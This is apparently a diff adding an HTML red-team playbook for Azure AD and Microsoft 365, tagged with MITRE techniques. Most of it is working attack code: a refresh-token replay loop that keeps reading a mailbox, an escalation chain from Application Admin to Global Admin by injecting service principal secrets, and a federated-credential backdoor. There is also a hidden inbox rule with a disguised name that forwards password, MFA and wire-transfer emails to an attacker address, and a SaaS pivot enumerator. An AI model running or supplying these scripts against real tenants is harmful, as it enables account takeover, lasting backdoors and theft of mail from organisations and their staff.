+        <span class="fn">print</span>(<span class="s">f"\n[*] Replaying refresh token at <span class="v">{datetime.utcnow().isoformat()}</span>..."</span>)
+        body = {
+            <span class="s">"grant_type"</span>: <span class="s">"refresh_token"</span>,
+            <span class="s">"client_id"</span>: <span class="v">client_id</span>,
+            <span class="s">"refresh_token"</span>: <span class="v">refresh_token</span>,
+            <span class="s">"scope"</span>: <span class="s">"Mail.Read Files.ReadWrite.All offline_access"</span>
+        }
+        <span class="k">if</span> <span class="v">client_secret</span>:
+            body[<span class="s">"client_secret"</span>] = <span class="v">client_secret</span>
+
+        resp = requests.post(<span class="v">self</span>.token_endpoint, data=body)
+        <span class="k">if</span> resp.status_code == 200:
+            tokens = resp.json()
+            <span class="fn">print</span>(<span class="s">"[+] NEW tokens obtained via replay!"</span>)
+            <span class="fn">print</span>(<span class="s">f"    → This works even after password reset."</span>)
+            <span class="fn">print</span>(<span class="s">f"    → New refresh token received (rolling window)."</span>)
+            <span class="k">return</span> tokens
+        <span class="k">elif</span> <span class="s">"AADSTS50173"</span> <span class="k">in</span> resp.text:
+            <span class="fn">print</span>(<span class="s">"[-] Token REVOKED — refresh token has been explicitly invalidated."</span>)
+        <span class="k">elif</span> <span class="s">"AADSTS700082"</span> <span class="k">in</span> resp.text:
+            <span class="fn">print</span>(<span class="s">"[-] Token EXPIRED — exceeded max inactive time."</span>)
+        <span class="k">else</span>:
+            <span class="fn">print</span>(<span class="s">f"[-] Replay failed: <span class="v">{resp.text[:200]}</span>"</span>)
+        <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">access_mailbox</span>(<span class="v">self</span>, <span class="v">access_token</span>, <span class="v">target_user</span>=<span class="s">"me"</span>):
+        <span class="s">"""Read mail using the access token to prove impact."""</span>
+        headers = {<span class="s">"Authorization"</span>: <span class="s">f"Bearer <span class="v">{access_token}</span>"</span>}
+        url = <span class="s">f"<span class="v">{self.graph}</span>/<span class="v">{target_user}</span>/messages?$top=5&amp;$select=subject,from,receivedDateTime"</span>
+        resp = requests.get(url, headers=headers)
+        <span class="k">if</span> resp.status_code == 200:
+            msgs = resp.json().get(<span class="s">"value"</span>, [])
+            <span class="fn">print</span>(<span class="s">f"\n[+] Mailbox access confirmed — <span class="v">{len(msgs)}</span> messages retrieved:"</span>)
+            <span class="k">for</span> m <span class="k">in</span> msgs:
+                sender = m.get(<span class="s">"from"</span>, {}).get(<span class="s">"emailAddress"</span>, {}).get(<span class="s">"address"</span>, <span class="s">"?"</span>)
+                <span class="fn">print</span>(<span class="s">f"    [{m['receivedDateTime'][:10]}] {sender}: {m['subject'][:60]}"</span>)
+        <span class="k">else</span>:
+            <span class="fn">print</span>(<span class="s">f"[-] Mail access denied: <span class="v">{resp.status_code}</span>"</span>)
+
+    <span class="k">def</span> <span class="fn">continuous_replay_loop</span>(<span class="v">self</span>, <span class="v">refresh_token</span>, <span class="v">client_id</span>, <span class="v">interval_hours</span>=12):
+        <span class="s">"""Maintain persistent access by periodically refreshing tokens."""</span>
+        <span class="fn">print</span>(<span class="s">f"[*] Starting persistent replay loop (every <span class="v">{interval_hours}</span>h)..."</span>)
+        current_rt = <span class="v">refresh_token</span>
+        cycle = 0
+        <span class="k">while</span> <span class="k">True</span>:
+            cycle += 1
+            <span class="fn">print</span>(<span class="s">f"\n{'='*50}"</span>)
+            <span class="fn">print</span>(<span class="s">f"[Cycle <span class="v">{cycle}</span>] <span class="v">{datetime.utcnow().isoformat()}</span>"</span>)
+            tokens = <span class="v">self</span>.replay_refresh_token(current_rt, <span class="v">client_id</span>)
+            <span class="k">if</span> tokens:
+                current_rt = tokens[<span class="s">"refresh_token"</span>]  <span class="c"># Use new refresh token</span>
+                <span class="v">self</span>.access_mailbox(tokens[<span class="s">"access_token"</span>])
+                <span class="fn">print</span>(<span class="s">f"[*] Next refresh in <span class="v">{interval_hours}</span>h..."</span>)
+                time.sleep(<span class="v">interval_hours</span> * 3600)
+            <span class="k">else</span>:
+                <span class="fn">print</span>(<span class="s">"[!] Persistence LOST — token invalidated."</span>)
+                <span class="k">break</span></pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 04 — PRIVILEGE ESCALATION                     -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s4">
+<div class="sec-head">
+  <span class="sec-num">04</span>
+  <h2 class="sec-title">Privilege Escalation</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-cyan"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1078.004</span>
+        <span class="tag tag-phase">PRIV ESC</span>
+        <span class="tag tag-lang">PYTHON</span>
+      </div>
+      <h3>4.1 — Application Admin → Global Admin Escalation Path</h3>
+      <p>Exploit the Application Administrator role to escalate to Global Admin via service principal credential injection and role assignment.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: Role Escalation Chain</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">Python 3</span>
+        <span class="code-file">escalate_to_ga.py</span>
+      </div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="c">"""
+Privilege Escalation: Application Admin → Global Admin
+Attack chain:
+  1. Find an SP with RoleManagement.ReadWrite.Directory (app permission)
+  2. Inject new credential into it (Application Admin can do this)
+  3. Auth as that SP
+  4. Use SP's permissions to assign Global Admin to attacker account
+
+This is the #1 most common Azure AD privilege escalation path.
+"""</span>
+
+<span class="k">import</span> requests, json
+
+<span class="k">class</span> <span class="fn">AzureADEscalation</span>:
+    <span class="k">def</span> <span class="fn">__init__</span>(<span class="v">self</span>, <span class="v">tenant_id</span>, <span class="v">initial_token</span>):
+        <span class="v">self</span>.tenant = <span class="v">tenant_id</span>
+        <span class="v">self</span>.graph = <span class="s">"https://graph.microsoft.com/v1.0"</span>
+        <span class="v">self</span>.token_url = <span class="s">f"https://login.microsoftonline.com/<span class="v">{tenant_id}</span>/oauth2/v2.0/token"</span>
+        <span class="v">self</span>.headers = {
+            <span class="s">"Authorization"</span>: <span class="s">f"Bearer <span class="v">{initial_token}</span>"</span>,
+            <span class="s">"Content-Type"</span>: <span class="s">"application/json"</span>
+        }
+
+    <span class="k">def</span> <span class="fn">step1_find_escalation_sp</span>(<span class="v">self</span>):
+        <span class="s">"""Find service principals that have RoleManagement.ReadWrite.Directory."""</span>
+        <span class="fn">print</span>(<span class="s">"[STEP 1] Finding SP with RoleManagement.ReadWrite.Directory..."</span>)
+        <span class="c"># RoleManagement.ReadWrite.Directory app role ID in Microsoft Graph</span>
+        target_role_id = <span class="s">"9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"</span>
+
+        url = <span class="s">f"<span class="v">{self.graph}</span>/servicePrincipals?$top=999&amp;$select=id,appId,displayName"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        sps = resp.json().get(<span class="s">"value"</span>, [])
+
+        <span class="k">for</span> sp <span class="k">in</span> sps:
+            roles_url = <span class="s">f"<span class="v">{self.graph}</span>/servicePrincipals/<span class="v">{sp['id']}</span>/appRoleAssignments"</span>
+            roles_resp = requests.get(roles_url, headers=<span class="v">self</span>.headers)
+            <span class="k">for</span> role <span class="k">in</span> roles_resp.json().get(<span class="s">"value"</span>, []):
+                <span class="k">if</span> role.get(<span class="s">"appRoleId"</span>) == target_role_id:
+                    <span class="fn">print</span>(<span class="s">f"  [+] FOUND: <span class="v">{sp['displayName']}</span> (appId: <span class="v">{sp['appId']}</span>)"</span>)
+                    <span class="k">return</span> sp
+        <span class="fn">print</span>(<span class="s">"  [-] No suitable SP found."</span>)
+        <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">step2_inject_secret</span>(<span class="v">self</span>, <span class="v">app_id</span>):
+        <span class="s">"""Add a new client secret to the application."""</span>
+        <span class="fn">print</span>(<span class="s">f"[STEP 2] Injecting credential into <span class="v">{app_id}</span>..."</span>)
+
+        <span class="c"># Resolve application object ID from appId</span>
+        url = <span class="s">f"<span class="v">{self.graph}</span>/applications?$filter=appId eq '<span class="v">{app_id}</span>'"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        app_obj = resp.json().get(<span class="s">"value"</span>, [{}])[0]
+
+        url = <span class="s">f"<span class="v">{self.graph}</span>/applications/<span class="v">{app_obj['id']}</span>/addPassword"</span>
+        body = {<span class="s">"passwordCredential"</span>: {<span class="s">"displayName"</span>: <span class="s">"ServiceRotation"</span>}}
+        resp = requests.post(url, headers=<span class="v">self</span>.headers, json=body)
+
+        <span class="k">if</span> resp.status_code == 200:
+            secret = resp.json()[<span class="s">"secretText"</span>]
+            <span class="fn">print</span>(<span class="s">f"  [+] Secret injected successfully"</span>)
+            <span class="k">return</span> secret
+        <span class="fn">print</span>(<span class="s">f"  [-] Failed: <span class="v">{resp.status_code}</span>"</span>)
+        <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">step3_auth_as_sp</span>(<span class="v">self</span>, <span class="v">client_id</span>, <span class="v">client_secret</span>):
+        <span class="s">"""Authenticate as the service principal."""</span>
+        <span class="fn">print</span>(<span class="s">"[STEP 3] Authenticating as service principal..."</span>)
+        body = {
+            <span class="s">"grant_type"</span>: <span class="s">"client_credentials"</span>,
+            <span class="s">"client_id"</span>: <span class="v">client_id</span>,
+            <span class="s">"client_secret"</span>: <span class="v">client_secret</span>,
+            <span class="s">"scope"</span>: <span class="s">"https://graph.microsoft.com/.default"</span>
+        }
+        resp = requests.post(<span class="v">self</span>.token_url, data=body)
+        <span class="k">if</span> resp.status_code == 200:
+            token = resp.json()[<span class="s">"access_token"</span>]
+            <span class="fn">print</span>(<span class="s">"  [+] Authenticated as SP with elevated permissions"</span>)
+            <span class="k">return</span> token
+        <span class="fn">print</span>(<span class="s">f"  [-] Auth failed: <span class="v">{resp.status_code}</span>"</span>)
+        <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">step4_assign_global_admin</span>(<span class="v">self</span>, <span class="v">sp_token</span>, <span class="v">target_user_id</span>):
+        <span class="s">"""Assign Global Administrator role to the attacker-controlled account."""</span>
+        <span class="fn">print</span>(<span class="s">f"[STEP 4] Assigning Global Admin to <span class="v">{target_user_id}</span>..."</span>)
+        headers = {
+            <span class="s">"Authorization"</span>: <span class="s">f"Bearer <span class="v">{sp_token}</span>"</span>,
+            <span class="s">"Content-Type"</span>: <span class="s">"application/json"</span>
+        }
+        <span class="c"># Global Administrator role template ID</span>
+        ga_template = <span class="s">"62e90394-69f5-4237-9190-012177145e10"</span>
+
+        <span class="c"># Activate the directory role if not already activated</span>
+        activate_body = {<span class="s">"roleTemplateId"</span>: ga_template}
+        requests.post(<span class="s">f"<span class="v">{self.graph}</span>/directoryRoles"</span>, headers=headers, json=activate_body)
+
+        <span class="c"># Get the activated role's object ID</span>
+        roles = requests.get(<span class="s">f"<span class="v">{self.graph}</span>/directoryRoles"</span>, headers=headers).json()
+        ga_role = <span class="fn">next</span>((r <span class="k">for</span> r <span class="k">in</span> roles.get(<span class="s">"value"</span>, [])
+                         <span class="k">if</span> r[<span class="s">"roleTemplateId"</span>] == ga_template), <span class="k">None</span>)
+
+        <span class="k">if not</span> ga_role:
+            <span class="fn">print</span>(<span class="s">"  [-] Could not resolve Global Admin role object"</span>)
+            <span class="k">return</span> <span class="k">False</span>
+
+        <span class="c"># Add the target user to Global Admin</span>
+        url = <span class="s">f"<span class="v">{self.graph}</span>/directoryRoles/<span class="v">{ga_role['id']}</span>/members/$ref"</span>
+        body = {<span class="s">"@odata.id"</span>: <span class="s">f"<span class="v">{self.graph}</span>/directoryObjects/<span class="v">{target_user_id}</span>"</span>}
+        resp = requests.post(url, headers=headers, json=body)
+
+        <span class="k">if</span> resp.status_code == 204:
+            <span class="fn">print</span>(<span class="s">"  [+] ✓ GLOBAL ADMIN ASSIGNED — ESCALATION COMPLETE"</span>)
+            <span class="k">return</span> <span class="k">True</span>
+        <span class="k">else</span>:
+            <span class="fn">print</span>(<span class="s">f"  [-] Role assignment failed: <span class="v">{resp.status_code}</span> <span class="v">{resp.text[:200]}</span>"</span>)
+            <span class="k">return</span> <span class="k">False</span>
+
+    <span class="k">def</span> <span class="fn">execute_chain</span>(<span class="v">self</span>, <span class="v">attacker_user_id</span>):
+        <span class="s">"""Execute full escalation chain."""</span>
+        <span class="fn">print</span>(<span class="s">"="</span> * 60)
+        <span class="fn">print</span>(<span class="s">"  PRIVILEGE ESCALATION: AppAdmin → Global Admin"</span>)
+        <span class="fn">print</span>(<span class="s">"="</span> * 60)
+        sp = <span class="v">self</span>.step1_find_escalation_sp()
+        <span class="k">if not</span> sp: <span class="k">return</span>
+        secret = <span class="v">self</span>.step2_inject_secret(sp[<span class="s">"appId"</span>])
+        <span class="k">if not</span> secret: <span class="k">return</span>
+        sp_token = <span class="v">self</span>.step3_auth_as_sp(sp[<span class="s">"appId"</span>], secret)
+        <span class="k">if not</span> sp_token: <span class="k">return</span>
+        <span class="v">self</span>.step4_assign_global_admin(sp_token, <span class="v">attacker_user_id</span>)</pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 05 — PERSISTENCE                              -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s5">
+<div class="sec-head">
+  <span class="sec-num">05</span>
+  <h2 class="sec-title">Persistence Mechanisms</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-purple"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1098.003</span>
+        <span class="tag tag-phase">PERSISTENCE</span>
+        <span class="tag tag-lang">POWERSHELL</span>
+      </div>
+      <h3>5.1 — Federated Identity Credential Backdoor</h3>
+      <p>Add a federated identity credential pointing to an attacker-controlled IdP. No shared secrets — the attacker's IdP issues tokens Azure AD trusts.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: Federated Identity Backdoor</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">PowerShell</span>
+        <span class="code-file">Add-FederatedBackdoor.ps1</span>
+      </div>
+<pre><span class="c">########################################################################</span>
+<span class="c"># Add-FederatedBackdoor.ps1</span>
+<span class="c"># Adds a federated identity credential to an existing app registration.</span>
+<span class="c"># The attacker's external IdP can then authenticate as this app.</span>
+<span class="c">########################################################################</span>
+
+<span class="k">param</span>(
+    [Parameter(Mandatory)]
+    [<span class="p">string</span>]<span class="v">$TargetAppObjectId</span>,
+
+    [<span class="p">string</span>]<span class="v">$AttackerIssuer</span> = <span class="s">"https://token.actions.githubusercontent.com"</span>,
+    [<span class="p">string</span>]<span class="v">$Subject</span>         = <span class="s">"repo:attacker-org/deploy:ref:refs/heads/main"</span>,
+    [<span class="p">string</span>]<span class="v">$CredName</span>       = <span class="s">"github-cicd-deploy"</span>
+)
+
+<span class="fn">Connect-MgGraph</span> <span class="k">-Scopes</span> <span class="s">"Application.ReadWrite.All"</span>
+
+<span class="c"># ── Verify the target app exists ──</span>
+<span class="v">$app</span> = <span class="fn">Get-MgApplication</span> <span class="k">-ApplicationId</span> <span class="v">$TargetAppObjectId</span>
+<span class="fn">Write-Host</span> <span class="s">"[*] Target app: <span class="v">$($app.DisplayName)</span> (<span class="v">$($app.AppId)</span>)"</span>
+
+<span class="c"># ── List existing federated credentials ──</span>
+<span class="v">$existing</span> = <span class="fn">Get-MgApplicationFederatedIdentityCredential</span> <span class="k">-ApplicationId</span> <span class="v">$TargetAppObjectId</span>
+<span class="fn">Write-Host</span> <span class="s">"[*] Existing federated credentials: <span class="v">$($existing.Count)</span>"</span>
+<span class="k">foreach</span> (<span class="v">$fc</span> <span class="k">in</span> <span class="v">$existing</span>) {
+    <span class="fn">Write-Host</span> <span class="s">"    - <span class="v">$($fc.Name)</span>: <span class="v">$($fc.Issuer)</span> / <span class="v">$($fc.Subject)</span>"</span>
+}
+
+<span class="c"># ── Add the backdoor federated credential ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Adding federated identity credential..."</span>
+<span class="v">$params</span> = @{
+    Name      = <span class="v">$CredName</span>
+    Issuer    = <span class="v">$AttackerIssuer</span>
+    Subject   = <span class="v">$Subject</span>
+    Audiences = @(<span class="s">"api://AzureADTokenExchange"</span>)
+}
+
+<span class="k">try</span> {
+    <span class="v">$result</span> = <span class="fn">New-MgApplicationFederatedIdentityCredential</span> `
+        <span class="k">-ApplicationId</span> <span class="v">$TargetAppObjectId</span> `
+        <span class="k">-BodyParameter</span> <span class="v">$params</span>
+
+    <span class="fn">Write-Host</span> <span class="s">"[+] BACKDOOR INSTALLED"</span> <span class="k">-ForegroundColor</span> Red
+    <span class="fn">Write-Host</span> <span class="s">"    Name:     <span class="v">$($result.Name)</span>"</span>
+    <span class="fn">Write-Host</span> <span class="s">"    Issuer:   <span class="v">$($result.Issuer)</span>"</span>
+    <span class="fn">Write-Host</span> <span class="s">"    Subject:  <span class="v">$($result.Subject)</span>"</span>
+    <span class="fn">Write-Host</span> <span class="s">"    ID:       <span class="v">$($result.Id)</span>"</span>
+    <span class="fn">Write-Host</span> <span class="s">"`n[*] The attacker's IdP can now obtain tokens for this app by"</span>
+    <span class="fn">Write-Host</span> <span class="s">"    exchanging its own JWT for an Azure AD token via:"</span>
+    <span class="fn">Write-Host</span> <span class="s">"    POST /oauth2/v2.0/token"</span>
+    <span class="fn">Write-Host</span> <span class="s">"      grant_type=client_credentials"</span>
+    <span class="fn">Write-Host</span> <span class="s">"      client_id=<span class="v">$($app.AppId)</span>"</span>
+    <span class="fn">Write-Host</span> <span class="s">"      client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"</span>
+    <span class="fn">Write-Host</span> <span class="s">"      client_assertion=&lt;JWT_FROM_ATTACKER_IDP&gt;"</span>
+} <span class="k">catch</span> {
+    <span class="fn">Write-Host</span> <span class="s">"[-] Failed: <span class="v">$($_.Exception.Message)</span>"</span> <span class="k">-ForegroundColor</span> Yellow
+}
+
+<span class="c"># ── Cleanup function ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] To remove this backdoor, run:"</span>
+<span class="fn">Write-Host</span> <span class="s">"    Remove-MgApplicationFederatedIdentityCredential ``"</span>
+<span class="fn">Write-Host</span> <span class="s">"        -ApplicationId <span class="v">$TargetAppObjectId</span> ``"</span>
+<span class="fn">Write-Host</span> <span class="s">"        -FederatedIdentityCredentialId <span class="v">$($result.Id)</span>"</span></pre>
+    </div>
+  </div>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-amber"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1098.002</span>
+        <span class="tag tag-phase">PERSISTENCE</span>
+        <span class="tag tag-lang">POWERSHELL</span>
+      </div>
+      <h3>5.2 — Inbox Rule & Mail Flow Persistence</h3>
+      <p>Create hidden inbox rules and transport rules that silently forward or copy emails to attacker-controlled addresses.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: Mail Persistence Mechanisms</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">PowerShell</span>
+        <span class="code-file">Set-MailPersistence.ps1</span>
+      </div>
+<pre><span class="c">########################################################################</span>
+<span class="c"># Set-MailPersistence.ps1</span>
+<span class="c"># Creates persistent mail exfil via inbox rules and Graph API.</span>
+<span class="c"># Requires delegated access to the target mailbox.</span>
+<span class="c">########################################################################</span>
+
+<span class="k">param</span>(
+    [Parameter(Mandatory)][<span class="p">string</span>]<span class="v">$TargetUserId</span>,
+    [Parameter(Mandatory)][<span class="p">string</span>]<span class="v">$ExfilAddress</span>,
+    [<span class="p">switch</span>]<span class="v">$Cleanup</span>
+)
+
+<span class="fn">Connect-MgGraph</span> <span class="k">-Scopes</span> <span class="s">"MailboxSettings.ReadWrite"</span>, <span class="s">"Mail.ReadWrite"</span>
+
+<span class="c"># ── Method 1: Hidden Inbox Rule via Graph ──</span>
+<span class="fn">Write-Host</span> <span class="s">"[*] Creating inbox forwarding rule..."</span>
+
+<span class="v">$ruleBody</span> = @{
+    DisplayName = <span class="s">"_"</span>  <span class="c"># Minimal name — easy to overlook</span>
+    Sequence    = 1
+    IsEnabled   = <span class="v">$true</span>
+    Conditions  = @{
+        <span class="c"># Forward emails containing sensitive keywords</span>
+        SubjectContains = @(<span class="s">"password"</span>, <span class="s">"credentials"</span>, <span class="s">"confidential"</span>,
+                           <span class="s">"MFA"</span>, <span class="s">"token"</span>, <span class="s">"secret"</span>, <span class="s">"invoice"</span>,
+                           <span class="s">"wire"</span>, <span class="s">"transfer"</span>, <span class="s">"account"</span>)
+    }
+    Actions     = @{
+        ForwardTo = @(
+            @{
+                EmailAddress = @{
+                    Address = <span class="v">$ExfilAddress</span>
+                    Name    = <span class="s">"Audit System"</span>  <span class="c"># Disguised name</span>
+                }
+            }
+        )
+        <span class="c"># Also mark as read so user doesn't notice</span>
+        MarkAsRead = <span class="v">$true</span>
+        <span class="c"># Move to a hidden folder to reduce visibility</span>
+        MoveToFolder = <span class="s">"deletedItems"</span>
+    }
+}
+
+<span class="k">try</span> {
+    <span class="v">$rule</span> = <span class="fn">New-MgUserMailFolderMessageRule</span> `
+        <span class="k">-UserId</span> <span class="v">$TargetUserId</span> `
+        <span class="k">-MailFolderId</span> <span class="s">"inbox"</span> `
+        <span class="k">-BodyParameter</span> <span class="v">$ruleBody</span>
+
+    <span class="fn">Write-Host</span> <span class="s">"[+] Inbox rule created: <span class="v">$($rule.Id)</span>"</span> <span class="k">-ForegroundColor</span> Green
+    <span class="fn">Write-Host</span> <span class="s">"    Forwards matching mail to: <span class="v">$ExfilAddress</span>"</span>
+    <span class="fn">Write-Host</span> <span class="s">"    Keywords: password, credentials, MFA, token, wire, transfer..."</span>
+} <span class="k">catch</span> {
+    <span class="fn">Write-Host</span> <span class="s">"[-] Failed: <span class="v">$($_.Exception.Message)</span>"</span>
+}
+
+<span class="c"># ── Method 2: Delegate Access (BEC style) ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Adding mailbox delegate..."</span>
+<span class="c"># This grants another user read access to the mailbox</span>
+<span class="c"># Requires Exchange Online Management module for full delegate control</span>
+<span class="fn">Write-Host</span> <span class="s">"[*] For full delegate access, use Exchange Online PowerShell:"</span>
+<span class="fn">Write-Host</span> <span class="s">"    Add-MailboxPermission -Identity '<span class="v">$TargetUserId</span>' \"</span>
+<span class="fn">Write-Host</span> <span class="s">"        -User 'attacker@domain.com' -AccessRights FullAccess \"</span>
+<span class="fn">Write-Host</span> <span class="s">"        -AutoMapping `$false"</span>
+<span class="fn">Write-Host</span> <span class="s">"    # -AutoMapping $false prevents it showing in Outlook — stealthier"</span>
+
+<span class="c"># ── Verification ──</span>
+<span class="fn">Write-Host</span> <span class="s">"`n[*] Listing all inbox rules for <span class="v">$TargetUserId</span>:"</span>
+<span class="v">$allRules</span> = <span class="fn">Get-MgUserMailFolderMessageRule</span> `
+    <span class="k">-UserId</span> <span class="v">$TargetUserId</span> `
+    <span class="k">-MailFolderId</span> <span class="s">"inbox"</span>
+<span class="k">foreach</span> (<span class="v">$r</span> <span class="k">in</span> <span class="v">$allRules</span>) {
+    <span class="v">$fwd</span> = <span class="v">$r</span>.Actions.ForwardTo.EmailAddress.Address <span class="k">-join</span> <span class="s">", "</span>
+    <span class="fn">Write-Host</span> <span class="s">"    Rule: '<span class="v">$($r.DisplayName)</span>' → Fwd: <span class="v">$fwd</span>"</span>
+}
+
+<span class="c"># ── Cleanup ──</span>
+<span class="k">if</span> (<span class="v">$Cleanup</span> <span class="k">-and</span> <span class="v">$rule</span>) {
+    <span class="fn">Remove-MgUserMailFolderMessageRule</span> `
+        <span class="k">-UserId</span> <span class="v">$TargetUserId</span> `
+        <span class="k">-MailFolderId</span> <span class="s">"inbox"</span> `
+        <span class="k">-MessageRuleId</span> <span class="v">$rule</span>.Id
+    <span class="fn">Write-Host</span> <span class="s">"[✓] Rule cleaned up."</span> <span class="k">-ForegroundColor</span> Green
+}</pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ════════════════════════════════════════════════════════ -->
+<!--  SECTION 06 — LATERAL MOVEMENT                         -->
+<!-- ════════════════════════════════════════════════════════ -->
+<section class="section" id="s6">
+<div class="sec-head">
+  <span class="sec-num">06</span>
+  <h2 class="sec-title">Lateral Movement via SaaS Pivot</h2>
+</div>
+
+<div class="test-block">
+  <div class="test-header">
+    <div class="test-indicator ti-green"></div>
+    <div class="test-info">
+      <div class="test-tags">
+        <span class="tag tag-mitre">T1550.001</span>
+        <span class="tag tag-phase">LATERAL</span>
+        <span class="tag tag-lang">PYTHON</span>
+      </div>
+      <h3>6.1 — Cross-SaaS Token Pivot via OAuth</h3>
+      <p>Use Azure AD tokens to access connected third-party SaaS applications via SSO trust relationships.</p>
+    </div>
+  </div>
+  <div class="test-body">
+    <h4>Script: SaaS Federation Enumeration & Pivot</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">Python 3</span>
+        <span class="code-file">saas_pivot.py</span>
+      </div>
+<pre><span class="c">#!/usr/bin/env python3</span>
+<span class="c">"""
+SaaS Lateral Movement via Azure AD SSO Trust
+Enumerates all enterprise applications (service principals) and
+tests which third-party SaaS apps the compromised user can SSO into.
+"""</span>
+
+<span class="k">import</span> requests, json
+
+<span class="k">class</span> <span class="fn">SaaSPivot</span>:
+    <span class="k">def</span> <span class="fn">__init__</span>(<span class="v">self</span>, <span class="v">access_token</span>):
+        <span class="v">self</span>.headers = {
+            <span class="s">"Authorization"</span>: <span class="s">f"Bearer <span class="v">{access_token}</span>"</span>,
+            <span class="s">"Content-Type"</span>: <span class="s">"application/json"</span>
+        }
+        <span class="v">self</span>.graph = <span class="s">"https://graph.microsoft.com/v1.0"</span>
+
+    <span class="k">def</span> <span class="fn">enumerate_enterprise_apps</span>(<span class="v">self</span>):
+        <span class="s">"""Find all third-party SaaS apps federated with Azure AD."""</span>
+        <span class="fn">print</span>(<span class="s">"[*] Enumerating enterprise applications (SSO targets)..."</span>)
+        url = <span class="s">f"<span class="v">{self.graph}</span>/servicePrincipals?$top=999"</span>
+        url += <span class="s">"&amp;$select=displayName,appId,homepage,loginUrl,servicePrincipalType"</span>
+        url += <span class="s">"&amp;$filter=servicePrincipalType eq 'Application'"</span>
+
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        sps = resp.json().get(<span class="s">"value"</span>, [])
+
+        <span class="c"># Known high-value SaaS targets</span>
+        high_value = [<span class="s">"salesforce"</span>, <span class="s">"slack"</span>, <span class="s">"aws"</span>, <span class="s">"github"</span>,
+                      <span class="s">"jira"</span>, <span class="s">"confluence"</span>, <span class="s">"servicenow"</span>, <span class="s">"workday"</span>,
+                      <span class="s">"zoom"</span>, <span class="s">"dropbox"</span>, <span class="s">"box"</span>, <span class="s">"docusign"</span>, <span class="s">"snowflake"</span>]
+
+        targets = []
+        <span class="k">for</span> sp <span class="k">in</span> sps:
+            name = sp.get(<span class="s">"displayName"</span>, <span class="s">""</span>).lower()
+            is_high_value = <span class="fn">any</span>(hv <span class="k">in</span> name <span class="k">for</span> hv <span class="k">in</span> high_value)
+            marker = <span class="s">"🎯"</span> <span class="k">if</span> is_high_value <span class="k">else</span> <span class="s">"  "</span>
+            <span class="fn">print</span>(<span class="s">f"  <span class="v">{marker}</span> <span class="v">{sp['displayName']}</span>"</span>)
+            <span class="k">if</span> sp.get(<span class="s">"homepage"</span>):
+                <span class="fn">print</span>(<span class="s">f"       URL: <span class="v">{sp['homepage']}</span>"</span>)
+            <span class="k">if</span> is_high_value:
+                targets.append(sp)
+
+        <span class="fn">print</span>(<span class="s">f"\n[+] Found <span class="v">{len(sps)}</span> enterprise apps, <span class="v">{len(targets)}</span> high-value targets"</span>)
+        <span class="k">return</span> targets
+
+    <span class="k">def</span> <span class="fn">check_saml_config</span>(<span class="v">self</span>, <span class="v">sp_id</span>):
+        <span class="s">"""Check if a service principal uses SAML SSO (Golden SAML target)."""</span>
+        url = <span class="s">f"<span class="v">{self.graph}</span>/servicePrincipals/<span class="v">{sp_id}</span>"</span>
+        url += <span class="s">"?$select=preferredSingleSignOnMode,samlSingleSignOnSettings,loginUrl"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        <span class="k">if</span> resp.status_code == 200:
+            data = resp.json()
+            sso_mode = data.get(<span class="s">"preferredSingleSignOnMode"</span>, <span class="s">"none"</span>)
+            <span class="k">if</span> sso_mode == <span class="s">"saml"</span>:
+                <span class="fn">print</span>(<span class="s">f"  [!] SAML SSO configured — Golden SAML attack possible"</span>)
+            <span class="k">elif</span> sso_mode == <span class="s">"oidc"</span>:
+                <span class="fn">print</span>(<span class="s">f"  [*] OIDC SSO — token forwarding possible"</span>)
+            <span class="k">return</span> sso_mode
+        <span class="k">return</span> <span class="k">None</span>
+
+    <span class="k">def</span> <span class="fn">enumerate_user_app_assignments</span>(<span class="v">self</span>, <span class="v">user_id</span>):
+        <span class="s">"""List which apps a specific user has been assigned to (can SSO into)."""</span>
+        <span class="fn">print</span>(<span class="s">f"\n[*] Apps assigned to user <span class="v">{user_id}</span>:"</span>)
+        url = <span class="s">f"<span class="v">{self.graph}</span>/users/<span class="v">{user_id}</span>/appRoleAssignments"</span>
+        resp = requests.get(url, headers=<span class="v">self</span>.headers)
+        <span class="k">if</span> resp.status_code == 200:
+            assignments = resp.json().get(<span class="s">"value"</span>, [])
+            <span class="k">for</span> a <span class="k">in</span> assignments:
+                <span class="fn">print</span>(<span class="s">f"  → <span class="v">{a.get('resourceDisplayName', 'Unknown')}</span>"</span>)
+            <span class="k">return</span> assignments
